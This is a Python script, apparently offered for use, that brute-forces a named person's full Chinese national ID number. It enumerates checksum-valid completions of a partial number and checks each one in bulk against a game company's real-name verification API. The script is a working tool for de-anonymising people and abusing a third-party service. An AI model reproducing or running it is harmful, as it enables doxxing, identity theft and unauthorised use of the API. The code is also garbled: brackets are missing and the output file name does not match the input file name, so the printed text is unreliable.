import requests as r,json as j,random as a,itertools as i
from concurrent.futures import ThreadPoolExecutor as t,as_completed as f
def b(c):return 1950<=int(c  6:10  )<=2022 and int(c  10:12  )<=12 and int(c  12:14  )<=31 and  '1','0','X','9','8','7','6','5','4','3','2'    sum(int(c  k  )*  7,9,10,5,8,4,2,1,6,3,7,9,10,5,8,4,2    k  for k in range(17))%11  ==c  17  
def d(e):g=    h  if h!='x'else list("0123456789")for h in e  ;l=input("🚹性别:\n >").strip();g  16  =  "1","3","5","7","9"  if l=="男"else  "0","2","4","6","8"  if l=="女"else list("0123456789");open('by@XiaoXiaoMaoFish.fk','w',encoding='utf-8').writelines("".join(m)+"\n"for m in i.product(*g)if len("".join(m))==18 and b("".join(m)))
def n(o):p=r.Session();q="https://agent.cronlygames.cn/antiaddiction/nameverify.php";s=j.dumps({"ai":str(a.randint(10**17,10**18-1)),"action":"verify","card":o,"name":u});v={'User-Agent':"Custom-Agent",'Content-Type':"application/json"};w=p.post(q,data=s,headers=v,timeout=10);return o if w.status_code==200 and w.json().get("data",{}).get("result",{}).get("status")==0 else None
print('欢迎使用小猫の非库补💫\nby  @XiaoMaoFish🥳\n欢迎管理员👮🏻‍♂️')
u=input("♿️请输入姓名:\n >")
d(input('🆔输入身份证:\n >'))
x=open("by@XiaoMaoFish.fk").read().splitlines()
print(f"⚠️准备核验 {len(x)} 个身份证号中")
y=    
with t(max_workers=6*9)as z:A=  z.submit(n,B)for B in x  ;  print(f"\r♻️{C+1}/{len(x)}",end="",flush=True)or y.append(D.result())or print(f" ✅ 核验成功 {D.result()}")for C,D in enumerate(f(A))if D.result()  
print("\n🟢核验已完成"if y else"\n🔴空 没有核验成功的身份证号")
